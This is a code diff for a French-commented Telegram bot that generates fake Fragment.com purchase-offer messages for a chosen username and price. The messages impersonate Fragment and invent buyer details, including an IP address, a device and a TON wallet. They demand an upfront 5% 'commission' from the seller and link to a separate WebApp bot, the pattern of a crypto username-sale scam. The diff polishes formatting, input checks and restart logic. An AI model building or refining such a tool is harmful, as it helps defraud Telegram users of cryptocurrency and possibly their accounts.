@@ -7,6 +7,7 @@ from http.server import HTTPServer, BaseHTTPRequestHandler
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import Application, CommandHandler, ContextTypes
 from telegram.error import NetworkError, TimedOut, Conflict
+from telegram.helpers import escape_markdown
 
 # Configuration simple du logging
 import logging
@@ -28,16 +29,32 @@ class HealthCheckHandler(BaseHTTPRequestHandler):
     def do_GET(self):
         if self.path in ['/', '/health']:
             self.send_response(200)
-            self.send_header('Content-type', 'text/plain')
+            self.send_header('Content-type', 'text/html; charset=utf-8')
             self.send_header('Access-Control-Allow-Origin', '*')
             self.end_headers()
-            self.wfile.write(b'Fragment Bot is running successfully!')
+            
+            html_content = """
+            <!DOCTYPE html>
+            <html>
+            <head>
+                <title>Fragment Bot Status</title>
+                <meta charset="utf-8">
+            </head>
+            <body>
+                <h1>🤖 Fragment Deal Generator</h1>
+                <p>✅ Bot is running successfully!</p>
+                <p>🔗 Telegram: @BidRequestWebApp_bot</p>
+                <p>📊 Status: Active</p>
+            </body>
+            </html>
+            """
+            self.wfile.write(html_content.encode('utf-8'))
         else:
             self.send_response(404)
             self.end_headers()
 
     def log_message(self, format, *args):
-        pass  # Supprime les logs HTTP
+        pass
 
 def start_health_server():
     """Démarre le serveur de santé pour Render"""
@@ -59,7 +76,11 @@ async def get_ton_price():
             ) as response:
                 if response.status == 200:
                     data = await response.json()
-                    return float(data.get('Price', 5.50))
+                    price = float(data.get('Price', 5.50))
+                    if price > 0:
+                        return price
+                    else:
+                        return 5.50
                 else:
                     return 5.50
     except Exception:
@@ -67,7 +88,7 @@ async def get_ton_price():
 
 # ===== FONCTION GÉNÉRATION MESSAGE =====
 async def generate_fragment_message(username, price):
-    """Génère le message Fragment avec calculs en temps réel"""
+    """Génère le message Fragment avec formatage sécurisé"""
     try:
         # Calculs
         commission = price * 0.05
@@ -75,25 +96,28 @@ async def generate_fragment_message(username, price):
         price_usd = price * ton_to_usd
         commission_usd = commission * ton_to_usd
         
-        # Message personnalisé
-        message = f"""We have received a purchase request for your username @{username.upper()} via Fragment.com. Below are the transaction details:
+        # Nettoyage et validation du username
+        clean_username = str(username).strip().replace('@', '').upper()
+        
+        # Message avec formatage sécurisé (pas de Markdown problématique)
+        message = f"""We have received a purchase request for your username @{clean_username} via Fragment.com. Below are the transaction details:
 
-**• Offer Amount: 💎{price:g} TON (${price_usd:.2f} USD)
-• Commission: 💎{commission:g} TON (${commission_usd:.2f} USD)**
+• Offer Amount: 💎{price:g} TON (${price_usd:.2f} USD)
+• Commission: 💎{commission:g} TON (${commission_usd:.2f} USD)
 
 Please note that a 5% commission is charged to the seller prior to accepting the deal. This ensures a secure and efficient transaction process.
 
 Additional Information:
 • Device: Safari on macOS  
 • IP Address: 103.56.72.245
-• Wallet: [EQBBlxK8VBxEidbxw4oQVyLSk7iEf9VPJxetaRQpEbi-XG4U](https://tonviewer.com/EQBBlxK8VBxEidbxw4oQVyLSk7iEf9VPJxetaRQpEbi-XG4U)
+• Wallet: EQBBlxK8VBxEidbxw4oQVyLSk7iEf9VPJxetaRQpEbi-XG4U
 
 Important:
-**• Please proceed only if you are willing to transform your username into a collectible. This action is irreversible.
-• If you choose not to proceed, simply ignore this message.**"""
+• Please proceed only if you are willing to transform your username into a collectible. This action is irreversible.
+• If you choose not to proceed, simply ignore this message."""
 
         # Bouton vers WebApp
-        button_url = f"https://t.me/BidRequestWebApp_bot/WebApp?startapp={username}-{price:g}"
+        button_url = f"https://t.me/BidRequestWebApp_bot/WebApp?startapp={clean_username.lower()}-{price:g}"
         keyboard = [[InlineKeyboardButton("View details", url=button_url)]]
         reply_markup = InlineKeyboardMarkup(keyboard)
         
@@ -105,8 +129,15 @@ Important:
 
 # ===== GESTIONNAIRE D'ERREURS =====
 async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Gestionnaire d'erreurs silencieux"""
-    pass
+    """Gestionnaire d'erreurs pour éviter les crashes"""
+    try:
+        error_msg = str(context.error)
+        if "Conflict" in error_msg:
+            print("⚠️ Conflit détecté - instance multiple")
+        else:
+            print(f"⚠️ Erreur gérée: {error_msg}")
+    except:
+        pass
 
 # ===== COMMANDES TELEGRAM =====
 async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -118,21 +149,21 @@ async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         user = update.effective_user
         chat_id = update.effective_chat.id
         
-        message = f"""🤖 **Fragment Deal Generator**
+        message = f"""🤖 Fragment Deal Generator
 
 Bonjour {user.first_name}! 
 
-📱 **Votre Chat ID:** `{chat_id}`
+📱 Votre Chat ID: {chat_id}
 
 Ce bot génère automatiquement des messages Fragment personnalisés.
 
-**Commandes disponibles:**
-• `/create username price` - Créer un message Fragment
-• `/help` - Aide
+Commandes disponibles:
+• /create username price - Créer un message Fragment
+• /help - Aide
 
-💎 **Prêt à créer vos deals!**"""
+💎 Prêt à créer vos deals!"""
         
-        await update.message.reply_text(message, parse_mode='Markdown')
+        await update.message.reply_text(message)
         print(f"✅ /start - {user.first_name} ({chat_id})")
         
     except Exception as e:
@@ -146,51 +177,61 @@ async def create_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
             
         if len(context.args) != 2:
             await update.message.reply_text(
-                "❌ **Usage:** `/create username price`\n"
-                "📝 **Exemple:** `/create crypto 1000`",
-                parse_mode='Markdown'
+                "❌ Usage: /create username price\n"
+                "📝 Exemple: /create crypto 1000"
             )
             return
             
-        username = context.args[0].strip().lower()
+        username = str(context.args[0]).strip().lower().replace('@', '')
         
         try:
             price = float(context.args[1])
         except ValueError:
-            await update.message.reply_text("❌ Format de prix invalide")
+            await update.message.reply_text("❌ Format de prix invalide. Utilisez des nombres.")
             return
         
         if price <= 0:
             await update.message.reply_text("❌ Le prix doit être supérieur à 0")
             return
             
+        if price > 1000000:
+            await update.message.reply_text("❌ Prix trop élevé (max: 1,000,000 TON)")
+            return
+            
         # Message de traitement
-        await update.message.reply_text("⏳ **Génération du deal...**", parse_mode='Markdown')
+        processing_msg = await update.message.reply_text("⏳ Génération du deal en cours...")
         
         # Génération du message
         message, reply_markup = await generate_fragment_message(username, price)
         
         if message and reply_markup:
+            # Envoi du message principal
             await update.message.reply_text(
                 message,
-                reply_markup=reply_markup,
-                parse_mode='Markdown'
+                reply_markup=reply_markup
             )
             
+            # Confirmation
             await update.message.reply_text(
-                f"✅ **Deal créé avec succès!**\n"
-                f"🎯 @{username} - {price} TON",
-                parse_mode='Markdown'
+                f"✅ Deal créé avec succès!\n"
+                f"🎯 @{username.upper()} - {price:g} TON"
             )
             
             print(f"✅ Deal: @{username} - {price} TON")
+            
+            # Suppression du message de traitement
+            try:
+                await processing_msg.delete()
+            except:
+                pass
+                
         else:
-            await update.message.reply_text("❌ Erreur lors de la génération")
+            await update.message.reply_text("❌ Erreur lors de la génération du message")
             
     except Exception as e:
         print(f"Erreur create: {e}")
         try:
-            await update.message.reply_text("❌ Erreur système")
+            await update.message.reply_text("❌ Erreur système. Veuillez réessayer.")
         except:
             pass
 
@@ -200,22 +241,22 @@ async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         if not update or not update.message:
             return
             
-        help_text = """🤖 **Fragment Deal Generator - Aide**
+        help_text = """🤖 Fragment Deal Generator - Aide
 
-**Commandes disponibles:**
-• `/start` - Informations du bot
-• `/create username price` - Créer un deal Fragment
-• `/help` - Afficher cette aide
+Commandes disponibles:
+• /start - Informations du bot
+• /create username price - Créer un deal Fragment
+• /help - Afficher cette aide
 
-**Exemple d'utilisation:**
-`/create crypto 1500`
+Exemple d'utilisation:
+/create crypto 1500
 
-**À propos:**
+À propos:
 Ce bot génère des messages Fragment professionnels avec calculs automatiques en TON et USD.
 
-💎 **Bot prêt à l'emploi!**"""
+💎 Bot prêt à l'emploi!"""
         
-        await update.message.reply_text(help_text, parse_mode='Markdown')
+        await update.message.reply_text(help_text)
         print("✅ Help affiché")
         
     except Exception as e:
@@ -224,56 +265,71 @@ Ce bot génère des messages Fragment professionnels avec calculs automatiques e
 # ===== FONCTION PRINCIPALE BOT =====
 def run_telegram_bot_sync():
     """Lance le bot Telegram en mode synchrone"""
-    try:
-        print("🚀 Initialisation du bot Telegram...")
-        
-        # Configuration de l'application
-        app = Application.builder().token(BOT_TOKEN).build()
-        
-        # Ajout des handlers
-        app.add_error_handler(error_handler)
-        app.add_handler(CommandHandler("start", start_command))
-        app.add_handler(CommandHandler("create", create_command))
-        app.add_handler(CommandHandler("help", help_command))
-        
-        print("✅ Bot configuré")
-        print(f"💎 Chat ID configuré: {FIXED_CHAT_ID}")
-        print("🔗 WebApp: BidRequestWebApp_bot/WebApp")
-        print("\n📋 Commandes disponibles:")
-        print("   • /start - Démarrer le bot")
-        print("   • /create username price - Créer un deal")
-        print("   • /help - Aide")
-        
-        print("🔄 Démarrage du polling...")
-        
-        # Démarrage en mode bloquant avec gestion d'erreurs
-        app.run_polling(
-            poll_interval=2.0,
-            timeout=10,
-            bootstrap_retries=5,
-            read_timeout=10,
-            write_timeout=10,
-            connect_timeout=10,
-            pool_timeout=10,
-            drop_pending_updates=True,
-            allowed_updates=['message'],
-            close_loop=True
-        )
-        
-        print("🛑 Bot arrêté")
-        
-    except KeyboardInterrupt:
-        print("\n🛑 Arrêt demandé par l'utilisateur")
-        
-    except Conflict as e:
-        print(f"❌ Conflit de bot: {e}")
-        print("ℹ️ Vérifiez qu'aucune autre instance ne tourne")
-        
-    except Exception as e:
-        print(f"❌ Erreur critique bot: {e}")
-        
-    finally:
-        print("🔚 Nettoyage terminé")
+    attempt = 0
+    max_attempts = 3
+    
+    while attempt < max_attempts:
+        attempt += 1
+        try:
+            print(f"🚀 Tentative de démarrage #{attempt}...")
+            
+            # Configuration de l'application
+            app = Application.builder().token(BOT_TOKEN).build()
+            
+            # Ajout des handlers
+            app.add_error_handler(error_handler)
+            app.add_handler(CommandHandler("start", start_command))
+            app.add_handler(CommandHandler("create", create_command))
+            app.add_handler(CommandHandler("help", help_command))
+            
+            print("✅ Bot configuré")
+            print(f"💎 Chat ID configuré: {FIXED_CHAT_ID}")
+            print("🔗 WebApp: BidRequestWebApp_bot/WebApp")
+            print("\n📋 Commandes disponibles:")
+            print("   • /start - Démarrer le bot")
+            print("   • /create username price - Créer un deal")
+            print("   • /help - Aide")
+            print("🔄 Démarrage du polling...")
+            
+            # Démarrage en mode bloquant
+            app.run_polling(
+                poll_interval=3.0,
+                timeout=15,
+                bootstrap_retries=3,
+                read_timeout=15,
+                write_timeout=15,
+                connect_timeout=15,
+                pool_timeout=15,
+                drop_pending_updates=True,
+                allowed_updates=['message'],
+                close_loop=True
+            )
+            
+            print("🛑 Bot arrêté normalement")
+            break
+            
+        except Conflict as e:
+            print(f"❌ Conflit (tentative {attempt}): {e}")
+            if attempt < max_attempts:
+                print(f"⏳ Attente 30s avant nouvelle tentative...")
+                import time
+                time.sleep(30)
+            else:
+                print("❌ Abandon après plusieurs tentatives de conflit")
+                
+        except KeyboardInterrupt:
+            print("\n🛑 Arrêt demandé par l'utilisateur")
+            break
+            
+        except Exception as e:
+            print(f"❌ Erreur (tentative {attempt}): {e}")
+            if attempt < max_attempts:
+                import time
+                time.sleep(10)
+            else:
+                print("❌ Abandon après plusieurs erreurs")
+                
+    print("🔚 Nettoyage terminé")
 
 # ===== FONCTION PRINCIPALE =====
 def main():
@@ -285,13 +341,13 @@ def main():
         # 1. Démarrage du serveur HTTP en arrière-plan
         health_thread = threading.Thread(target=start_health_server, daemon=True)
         health_thread.start()
-        print("✅ Serveur de santé démarré en arrière-plan")
+        print("✅ Serveur de santé démarré")
         
-        # 2. Attendre un peu pour s'assurer que le serveur démarre
+        # 2. Attente pour s'assurer que le serveur démarre
         import time
-        time.sleep(2)
+        time.sleep(3)
         
-        # 3. Lancement du bot Telegram en premier plan
+        # 3. Lancement du bot Telegram
         print("🤖 Lancement du bot Telegram...")
         run_telegram_bot_sync()
         
@@ -300,7 +356,6 @@ def main():
         
     except Exception as e:
         print(f"❌ Erreur critique: {e}")
-        sys.exit(1)
         
     finally:
         print("🔚 Application terminée")
